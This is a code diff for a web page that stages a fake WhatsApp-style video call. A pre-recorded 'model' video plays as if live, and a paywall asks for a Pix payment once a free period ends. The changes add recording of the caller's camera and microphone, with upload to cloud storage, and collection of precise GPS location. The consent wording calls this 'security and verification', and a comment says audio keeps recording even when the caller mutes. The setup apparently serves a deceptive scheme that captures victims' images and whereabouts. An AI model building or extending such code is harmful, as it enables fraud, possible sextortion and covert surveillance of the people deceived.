@@ -8,6 +8,8 @@ import {
   completeCall,
   createPixPayment,
   checkPayment,
+  saveGeolocation,
+  getRecordingUploadUrl,
 } from "@/lib/call.functions";
 import { toast } from "sonner";
 import { Mic, MicOff, Video, VideoOff, PhoneOff, Copy, Phone } from "lucide-react";
@@ -23,7 +25,14 @@ type Settings = {
   contact_url: string | null;
 };
 
-type Phase = "ringing" | "requesting" | "denied" | "in_call" | "offer" | "paying" | "finished";
+type Phase =
+  | "ringing"
+  | "requesting"
+  | "denied"
+  | "in_call"
+  | "offer"
+  | "paying"
+  | "finished";
 
 export const Route = createFileRoute("/call")({
   component: CallPage,
@@ -48,9 +57,24 @@ function formatBRL(cents: number) {
   });
 }
 
+function pickRecorderMime() {
+  if (typeof MediaRecorder === "undefined") return "";
+  const candidates = [
+    "video/webm;codecs=vp9,opus",
+    "video/webm;codecs=vp8,opus",
+    "video/webm",
+    "video/mp4",
+  ];
+  for (const m of candidates) {
+    if (MediaRecorder.isTypeSupported(m)) return m;
+  }
+  return "";
+}
+
 function CallPage() {
   const [settings, setSettings] = useState<Settings | null>(null);
   const [phase, setPhase] = useState<Phase>("ringing");
+  const [consent, setConsent] = useState(false);
   const [micOn, setMicOn] = useState(true);
   const [camOn, setCamOn] = useState(true);
   const [elapsed, setElapsed] = useState(0);
@@ -67,13 +91,23 @@ function CallPage() {
   const modelVideoRef = useRef<HTMLVideoElement | null>(null);
   const leadVideoRef = useRef<HTMLVideoElement | null>(null);
   const streamRef = useRef<MediaStream | null>(null);
+  const recorderRef = useRef<MediaRecorder | null>(null);
+  const chunksRef = useRef<Blob[]>([]);
+  const uploadedRef = useRef(false);
   const freeEndedRef = useRef(false);
+  const sessionIdRef = useRef<string | null>(null);
 
   const startCallFn = useServerFn(startCallSession);
   const endFreeFn = useServerFn(endFreeCall);
   const completeFn = useServerFn(completeCall);
   const createPixFn = useServerFn(createPixPayment);
   const checkPayFn = useServerFn(checkPayment);
+  const saveGeoFn = useServerFn(saveGeolocation);
+  const getUploadUrlFn = useServerFn(getRecordingUploadUrl);
+
+  useEffect(() => {
+    sessionIdRef.current = sessionId;
+  }, [sessionId]);
 
   // Load settings
   useEffect(() => {
@@ -93,61 +127,139 @@ function CallPage() {
       });
   }, []);
 
-  // Preload model video
+  // Fix camera bug: attach stream to <video> whenever the element mounts (phase changes)
   useEffect(() => {
-    if (!settings?.video_url) return;
-    const v = document.createElement("video");
-    v.src = settings.video_url;
-    v.preload = "auto";
-  }, [settings?.video_url]);
+    const el = leadVideoRef.current;
+    const s = streamRef.current;
+    if (el && s && el.srcObject !== s) {
+      el.srcObject = s;
+      el.play().catch(() => {});
+    }
+  }, [phase]);
 
   // Cleanup on unmount
   useEffect(() => {
     return () => {
       streamRef.current?.getTracks().forEach((t) => t.stop());
+      if (recorderRef.current && recorderRef.current.state !== "inactive") {
+        try {
+          recorderRef.current.stop();
+        } catch {
+          /* noop */
+        }
+      }
     };
   }, []);
 
   // Timer
   useEffect(() => {
     if (phase !== "in_call") return;
-    const start = Date.now();
+    const start = Date.now() - elapsed * 1000;
     const iv = setInterval(() => {
       setElapsed(Math.floor((Date.now() - start) / 1000));
     }, 250);
     return () => clearInterval(iv);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [phase]);
 
-  // Handle free-call timeout
+  // Free-call timeout
   useEffect(() => {
     if (phase !== "in_call" || !settings || !sessionId) return;
     if (freeEndedRef.current) return;
     if (elapsed >= settings.free_duration_seconds) {
       freeEndedRef.current = true;
-      // Pause model video, freeze lead cam
       modelVideoRef.current?.pause();
       setPhase("offer");
       endFreeFn({ data: { sessionId } }).catch(console.error);
     }
   }, [elapsed, phase, settings, sessionId, endFreeFn]);
 
+  // Upload the recording blob (called at hang up / video end)
+  const uploadRecording = useCallback(async () => {
+    if (uploadedRef.current) return;
+    const sid = sessionIdRef.current;
+    const chunks = chunksRef.current;
+    if (!sid || chunks.length === 0) return;
+    uploadedRef.current = true;
+    const recorder = recorderRef.current;
+    const type = recorder?.mimeType || "video/webm";
+    const ext = type.includes("mp4") ? "mp4" : "webm";
+    const blob = new Blob(chunks, { type });
+    try {
+      const { signedUrl } = await getUploadUrlFn({
+        data: { sessionId: sid, ext },
+      });
+      await fetch(signedUrl, {
+        method: "PUT",
+        headers: { "Content-Type": type, "x-upsert": "true" },
+        body: blob,
+      });
+    } catch (err) {
+      console.error("upload failed", err);
+      uploadedRef.current = false;
+    }
+  }, [getUploadUrlFn]);
+
   // Answer button
   const handleAnswer = useCallback(async () => {
     if (!settings) return;
+    if (!consent) {
+      toast.error("Você precisa autorizar a gravação para continuar.");
+      return;
+    }
     setPhase("requesting");
     try {
       const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user" },
+        video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
         audio: true,
       });
       streamRef.current = stream;
-      if (leadVideoRef.current) {
-        leadVideoRef.current.srcObject = stream;
-        await leadVideoRef.current.play().catch(() => {});
-      }
-      // Start server session
-      const { sessionId: sid } = await startCallFn({});
+
+      // Start server session with consent flag + IP-derived geo
+      const { sessionId: sid } = await startCallFn({ data: { consent: true } });
       setSessionId(sid);
+      sessionIdRef.current = sid;
+
+      // Ask for precise geolocation (best-effort)
+      if (typeof navigator !== "undefined" && navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            saveGeoFn({
+              data: {
+                sessionId: sid,
+                lat: pos.coords.latitude,
+                lng: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+              },
+            }).catch(console.error);
+          },
+          () => {
+            /* denied — server already has IP-based geo */
+          },
+          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 },
+        );
+      }
+
+      // Start MediaRecorder
+      const mimeType = pickRecorderMime();
+      try {
+        const recorder = new MediaRecorder(
+          stream,
+          mimeType ? { mimeType, bitsPerSecond: 800_000 } : undefined,
+        );
+        recorderRef.current = recorder;
+        chunksRef.current = [];
+        recorder.ondataavailable = (e) => {
+          if (e.data && e.data.size > 0) chunksRef.current.push(e.data);
+        };
+        recorder.onstop = () => {
+          uploadRecording();
+        };
+        recorder.start(1000);
+      } catch (err) {
+        console.warn("MediaRecorder not supported", err);
+      }
+
       // Start model video
       if (modelVideoRef.current) {
         modelVideoRef.current.muted = false;
@@ -159,9 +271,9 @@ function CallPage() {
       console.error(err);
       setPhase("denied");
     }
-  }, [settings, startCallFn]);
+  }, [settings, consent, startCallFn, saveGeoFn, uploadRecording]);
 
-  // Mic toggle
+  // Mic toggle (kept enabled for recorder even when muted for the call)
   const toggleMic = useCallback(() => {
     const stream = streamRef.current;
     if (!stream) return;
@@ -170,7 +282,6 @@ function CallPage() {
     setMicOn(next);
   }, [micOn]);
 
-  // Cam toggle
   const toggleCam = useCallback(() => {
     const stream = streamRef.current;
     if (!stream) return;
@@ -179,26 +290,38 @@ function CallPage() {
     setCamOn(next);
   }, [camOn]);
 
-  // Hang up
-  const hangUp = useCallback(async () => {
+  const finalize = useCallback(async () => {
+    // stop recorder first so onstop uploads
+    const rec = recorderRef.current;
+    if (rec && rec.state !== "inactive") {
+      try {
+        rec.stop();
+      } catch {
+        /* noop */
+      }
+    } else {
+      uploadRecording();
+    }
+    // Give the recorder a tick to flush
+    await new Promise((r) => setTimeout(r, 200));
     streamRef.current?.getTracks().forEach((t) => t.stop());
     modelVideoRef.current?.pause();
-    if (sessionId) {
-      await completeFn({ data: { sessionId } }).catch(console.error);
+    const sid = sessionIdRef.current;
+    if (sid) {
+      await completeFn({ data: { sessionId: sid } }).catch(console.error);
     }
-    setPhase("finished");
-  }, [sessionId, completeFn]);
+  }, [completeFn, uploadRecording]);
 
-  // Model video ended
+  const hangUp = useCallback(async () => {
+    await finalize();
+    setPhase("finished");
+  }, [finalize]);
+
   const handleVideoEnded = useCallback(async () => {
-    streamRef.current?.getTracks().forEach((t) => t.stop());
-    if (sessionId) {
-      await completeFn({ data: { sessionId } }).catch(console.error);
-    }
+    await finalize();
     setPhase("finished");
-  }, [sessionId, completeFn]);
+  }, [finalize]);
 
-  // Start payment
   const startPayment = useCallback(async () => {
     if (!sessionId) return;
     setPhase("paying");
@@ -212,7 +335,6 @@ function CallPage() {
     }
   }, [sessionId, createPixFn]);
 
-  // Poll for payment approval
   useEffect(() => {
     if (phase !== "paying" || !paymentInfo?.configured) return;
     let cancelled = false;
@@ -224,15 +346,10 @@ function CallPage() {
           });
           if (cancelled) return;
           if (status === "approved") {
-            // Resume call
             freeEndedRef.current = false;
-            if (leadVideoRef.current && streamRef.current) {
-              leadVideoRef.current.srcObject = streamRef.current;
-            }
             streamRef.current?.getVideoTracks().forEach((t) => (t.enabled = camOn));
             streamRef.current?.getAudioTracks().forEach((t) => (t.enabled = micOn));
             await modelVideoRef.current?.play().catch(() => {});
-            // Bump free_duration_seconds so it doesn't trigger again
             if (settings) {
               setSettings({
                 ...settings,
@@ -267,14 +384,10 @@ function CallPage() {
 
   const modelName = settings?.model_name ?? "Modelo";
   const price = formatBRL(paymentInfo?.amountCents ?? settings?.price_cents ?? 3000);
-
   const initial = useMemo(() => modelName.charAt(0).toUpperCase(), [modelName]);
-
-  // ---------- RENDER ----------
 
   return (
     <div className="fixed inset-0 overflow-hidden bg-black text-white">
-      {/* Background model video (only visible after in_call) */}
       {settings?.video_url ? (
         <video
           ref={modelVideoRef}
@@ -290,13 +403,11 @@ function CallPage() {
         />
       ) : null}
 
-      {/* Dark gradient overlay */}
       <div className="pointer-events-none absolute inset-x-0 top-0 h-40 bg-gradient-to-b from-black/70 to-transparent" />
       <div className="pointer-events-none absolute inset-x-0 bottom-0 h-56 bg-gradient-to-t from-black/80 to-transparent" />
 
-      {/* ---------- RINGING ---------- */}
       {phase === "ringing" ? (
-        <div className="absolute inset-0 flex flex-col items-center justify-between py-16">
+        <div className="absolute inset-0 flex flex-col items-center justify-between py-14">
           <div className="flex flex-col items-center gap-4">
             <div className="text-sm uppercase tracking-widest text-white/60">
               Chamada de vídeo
@@ -311,37 +422,51 @@ function CallPage() {
             <div className="animate-pulse text-sm text-white/70">chamando...</div>
           </div>
 
-          <div className="flex w-full items-center justify-around px-10">
-            <button
-              onClick={() => setPhase("finished")}
-              className="flex h-16 w-16 items-center justify-center rounded-full bg-red-500 shadow-lg shadow-red-500/40 transition active:scale-95"
-              aria-label="Recusar"
-            >
-              <PhoneOff className="h-7 w-7" />
-            </button>
-            <button
-              onClick={handleAnswer}
-              className="flex h-16 w-16 items-center justify-center rounded-full bg-emerald-500 shadow-lg shadow-emerald-500/40 transition active:scale-95"
-              aria-label="Atender"
-            >
-              <Phone className="h-7 w-7" />
-            </button>
+          <div className="flex w-full flex-col items-center gap-6 px-6">
+            <label className="flex max-w-xs items-start gap-3 rounded-2xl border border-white/10 bg-black/50 p-3 text-left text-xs text-white/80 backdrop-blur">
+              <input
+                type="checkbox"
+                checked={consent}
+                onChange={(e) => setConsent(e.target.checked)}
+                className="mt-0.5 h-4 w-4 accent-emerald-500"
+              />
+              <span>
+                Autorizo a gravação de vídeo, áudio e localização durante esta
+                chamada para fins de segurança e verificação.
+              </span>
+            </label>
+
+            <div className="flex w-full items-center justify-around">
+              <button
+                onClick={() => setPhase("finished")}
+                className="flex h-16 w-16 items-center justify-center rounded-full bg-red-500 shadow-lg shadow-red-500/40 transition active:scale-95"
+                aria-label="Recusar"
+              >
+                <PhoneOff className="h-7 w-7" />
+              </button>
+              <button
+                onClick={handleAnswer}
+                disabled={!consent}
+                className="flex h-16 w-16 items-center justify-center rounded-full bg-emerald-500 shadow-lg shadow-emerald-500/40 transition active:scale-95 disabled:opacity-40"
+                aria-label="Atender"
+              >
+                <Phone className="h-7 w-7" />
+              </button>
+            </div>
           </div>
         </div>
       ) : null}
 
-      {/* ---------- REQUESTING PERMISSION ---------- */}
       {phase === "requesting" ? (
         <div className="absolute inset-0 flex flex-col items-center justify-center gap-4 bg-black/80 px-8 text-center">
           <div className="h-12 w-12 animate-spin rounded-full border-4 border-white/20 border-t-emerald-500" />
           <div className="text-lg font-medium">Conectando…</div>
           <div className="text-sm text-white/60">
-            Permita o acesso à câmera e ao microfone
+            Permita o acesso à câmera, ao microfone e à localização
           </div>
         </div>
       ) : null}
 
-      {/* ---------- DENIED ---------- */}
       {phase === "denied" ? (
         <div className="absolute inset-0 flex flex-col items-center justify-center gap-6 bg-black px-8 text-center">
           <VideoOff className="h-14 w-14 text-red-500" />
@@ -361,10 +486,8 @@ function CallPage() {
         </div>
       ) : null}
 
-      {/* ---------- IN CALL / OFFER (WhatsApp shell) ---------- */}
-      {(phase === "in_call" || phase === "offer" || phase === "paying") ? (
+      {phase === "in_call" || phase === "offer" || phase === "paying" ? (
         <>
-          {/* Top bar */}
           <div className="absolute inset-x-0 top-0 z-10 flex items-center justify-between px-5 pt-8">
             <div className="flex items-center gap-3">
               <ModelAvatar
@@ -378,9 +501,12 @@ function CallPage() {
                 <div className="text-xs text-white/70">{formatTime(elapsed)}</div>
               </div>
             </div>
+            <div className="flex items-center gap-1 rounded-full bg-red-500/90 px-2 py-1 text-[10px] font-medium">
+              <span className="h-1.5 w-1.5 animate-pulse rounded-full bg-white" />
+              REC
+            </div>
           </div>
 
-          {/* Lead camera (top right) */}
           <div className="absolute right-4 top-24 z-10 h-40 w-28 overflow-hidden rounded-2xl border border-white/10 bg-black shadow-2xl">
             <video
               ref={leadVideoRef}
@@ -398,7 +524,6 @@ function CallPage() {
             ) : null}
           </div>
 
-          {/* Bottom controls */}
           {phase === "in_call" ? (
             <div className="absolute inset-x-0 bottom-0 z-10 flex items-center justify-around px-8 pb-12">
               <ControlButton
@@ -425,7 +550,6 @@ function CallPage() {
             </div>
           ) : null}
 
-          {/* Offer overlay */}
           {phase === "offer" ? (
             <div className="absolute inset-0 z-20 flex flex-col items-center justify-center gap-5 bg-black/85 px-6 text-center backdrop-blur-md">
               <div className="text-xs uppercase tracking-widest text-white/50">
@@ -453,7 +577,6 @@ function CallPage() {
             </div>
           ) : null}
 
-          {/* Paying overlay */}
           {phase === "paying" ? (
             <div className="absolute inset-0 z-20 flex flex-col items-center justify-center gap-4 overflow-y-auto bg-black/90 px-6 py-8 text-center backdrop-blur-md">
               {!paymentInfo ? (
@@ -516,7 +639,6 @@ function CallPage() {
         </>
       ) : null}
 
-      {/* ---------- FINISHED ---------- */}
       {phase === "finished" ? (
         <div className="absolute inset-0 flex flex-col items-center justify-center gap-4 bg-black px-8 text-center">
           <ModelAvatar
@@ -582,17 +704,15 @@ function ModelAvatar({
   const size = small ? "h-10 w-10 text-sm" : "h-32 w-32 text-5xl";
   return (
     <div
-      className={`relative overflow-hidden rounded-full bg-gradient-to-br from-emerald-500 to-emerald-700 ${size} ${pulsing ? "shadow-2xl shadow-emerald-500/40" : ""}`}
+      className={`relative overflow-hidden rounded-full bg-gradient-to-br from-emerald-500 to-emerald-700 ${size} ${
+        pulsing ? "shadow-2xl shadow-emerald-500/40" : ""
+      }`}
     >
       {pulsing ? (
         <span className="absolute inset-0 animate-ping rounded-full bg-emerald-500/30" />
       ) : null}
       {photo ? (
-        <img
-          src={photo}
-          alt={name}
-          className="relative h-full w-full object-cover"
-        />
+        <img src={photo} alt={name} className="relative h-full w-full object-cover" />
       ) : (
         <div className="relative flex h-full w-full items-center justify-center font-semibold text-white">
           {initial}
